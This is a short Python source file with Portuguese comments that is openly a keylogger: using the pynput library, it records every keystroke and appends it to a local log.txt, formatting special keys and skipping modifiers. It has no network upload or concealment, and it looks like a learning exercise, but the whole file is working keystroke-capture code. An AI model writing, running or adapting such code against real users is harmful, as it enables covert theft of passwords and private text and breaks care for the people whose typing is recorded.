from pynput import keyboard #!biblioteca que armazena as entradas digitadas pelo usuário no teclado


# Teclas que não quero que o scipt armazene no log (para evitar deixar o texto confuso e poluído)
IGNORAR_TECLAS  = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

#? Esse trecho do código são as regras para que o script escreva os caracteres digitados pelo usuario de forma organizada e padronizda, sem isso o "log.txt" ficaria todo bagunçado

# Essa função "on_press" é chamada todas as vezes que uma tecla for digitada
def on_press(key):
    try:
        #* se for uma tecla normal (letra, número, símbolo...)
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)
    
    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
                
            elif key == keyboard.Key.enter:
                f.write("\n")
                
            elif key == keyboard.Key.tab:
                f.write("\t")
                
            elif key == keyboard.Key.backspace:
                f.write(" ")
                
            elif key == keyboard.Key.esc:
                f.write("[esc]")
                
            elif key in IGNORAR_TECLAS:
                pass
            
            else:
                f.write(f"[{key}]")

#! Linha principal do Keylogger            
with keyboard.Listener(on_press = on_press) as listener:
    listener.join() #mantém o script funcionando até que ele seja fechado manualmente                
            
                    
                
                        